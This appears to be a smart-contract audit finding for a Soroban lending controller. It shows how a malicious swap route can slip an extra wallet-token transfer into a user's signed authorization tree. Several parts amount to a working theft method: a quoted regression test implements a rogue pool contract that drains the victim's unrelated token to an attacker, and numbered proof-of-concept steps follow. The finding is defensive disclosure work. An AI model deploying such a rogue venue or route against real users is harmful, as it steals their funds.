### Title
Malicious swap route can inject unauthorized wallet transfers beneath the caller’s authorization - (File: contracts/controller/src/strategies/swap.rs)

### Summary
Controller strategy routes are attacker-controlled opaque bytes that are forwarded to the configured router, while the router can invoke route-selected third-party contracts without an allowlist; a malicious venue can then add a token transfer draining an unrelated caller token to the signed authorization tree. [1](#0-0) [2](#0-1) 

### Finding Description
`swap_tokens` accepts the caller-supplied `StrategySwap` bytes and passes them to `router.execute_strategy` after authorizing only the controller’s intended input transfer. [3](#0-2)  The router resolves pool and token addresses from those bytes and does not restrict invoked venues to a protocol allowlist. [4](#0-3)  Consequently, a route-named contract executes below the caller’s authorized strategy invocation and can request an additional `token.transfer(caller, attacker, amount)`; simulation records that transfer as an authorization child, and the transfer succeeds if the caller signs the generated tree. [5](#0-4)  The regression test demonstrates this through `swap_collateral(caller, account_id, usdc, amount, eth, rogue_route)`: a rogue hop contract calls `transfer` for a wallet token that is neither the strategy input nor output. [6](#0-5) [7](#0-6) 

### Impact Explanation
This can permanently steal unrelated user funds rather than merely providing a poor exchange rate. [8](#0-7)  In the demonstrated execution, signing the poisoned tree reduces the victim’s unrelated wallet-token balance to zero and transfers the full balance to the attacker. [9](#0-8)  Neither the route’s `min_out`, the controller’s positive-output check, nor final account-risk validation bounds this separate wallet transfer. [10](#0-9) [11](#0-10) 

### Likelihood Explanation
An unprivileged attacker can deploy the rogue venue and construct route bytes naming it, then supply those bytes through any route-generation or transaction-building path consumed by a victim. [2](#0-1)  The attack does require the victim to sign an authorization tree containing the extra transfer, but the tree is nested under a normal-looking `swap_collateral`, `multiply`, `swap_debt`, or `repay_debt_with_collateral` operation and is not bounded by the swap parameters themselves. [12](#0-11) [13](#0-12)  This is therefore a plausible Medium-severity phishing/malicious-route vector rather than a purely self-inflicted bad trade. [2](#0-1) 

### Recommendation
Restrict route venue and token contracts to governance-approved addresses, or change the route format and dispatcher so venue calls cannot become descendants capable of consuming caller authorization. [1](#0-0)  At minimum, make the router reject venue-side authorization requirements outside the router’s own expected transfer auth and require clients to refuse any authorization child other than the single expected input transfer. [10](#0-9) 

### Proof of Concept
1. Deploy a malicious contract whose invoked swap method calls `token::transfer(victim, attacker, wallet_balance)` for a token unrelated to the strategy. [14](#0-13) 
2. Encode a route naming that contract as a hop while still delivering enough output for the strategy’s measured-output checks. [6](#0-5) 
3. Have the victim invoke `swap_collateral(victim, account_id, USDC, amount, ETH, route)`. [15](#0-14) 
4. Simulation records the malicious wallet-token transfer as a child of the victim’s `swap_collateral` authorization. [16](#0-15) 
5. If the victim signs that returned tree, the unrelated wallet token is transferred to the attacker while the strategy otherwise completes. [9](#0-8)

### Citations

**File:** contracts/controller/src/strategies/swap.rs (L29-38)
```rust
    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-54)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** docs/explanation/threat-model.md (L154-164)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L54-71)
```rust
#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L111-124)
```rust
    fn route_through_pool_stealing(&self, amount: i128) -> Bytes {
        let plan = (
            self.alice.clone(),
            self.wallet_token.clone(),
            self.attacker.clone(),
            amount,
        );
        RoutedSwap {
            hop_pool: self.t.env.register(RogueHopPool, plan),
            min_out: FAIR_OUT_ETH,
            token_in: self.t.resolve_asset("USDC"),
            token_out: self.t.resolve_asset("ETH"),
        }
        .to_xdr(&self.t.env)
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L134-157)
```rust
    fn swap_args(&self, route: &Bytes) -> Vec<Val> {
        let (usdc, eth) = self.assets();
        (
            self.alice.clone(),
            self.account_id,
            usdc,
            SWAP_IN_USDC,
            eth,
            route.clone(),
        )
            .into_val(&self.t.env)
    }

    fn try_swap(&self, route: &Bytes) -> Result<(), soroban_sdk::Error> {
        let (usdc, eth) = self.assets();
        let ctrl = self.t.ctrl_client();
        let result = ctrl.try_swap_collateral(
            &self.alice,
            &self.account_id,
            &usdc,
            &SWAP_IN_USDC,
            &eth,
            route,
        );
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L172-181)
```rust
        let root = MockAuthInvoke {
            contract: &self.t.controller,
            fn_name: "swap_collateral",
            args: self.swap_args(route),
            sub_invokes: children,
        };
        self.t.env.mock_auths(&[MockAuth {
            address: &self.alice,
            invoke: &root,
        }]);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-225)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-268)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```

**File:** contracts/controller/src/lib.rs (L310-331)
```rust
    #[when_not_paused]
    fn repay_debt_with_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        collateral: HubAssetKey,
        collateral_amount: i128,
        debt: HubAssetKey,
        swap: Bytes,
        close_position: bool,
    ) {
        strategies::repay_debt_with_collateral::process_repay_debt_with_collateral(
            &env,
            &caller,
            RepayWithCollateralParams {
                account_id,
                collateral: &collateral,
                collateral_amount,
                debt: &debt,
                swap: &swap,
                close_position,
            },
```
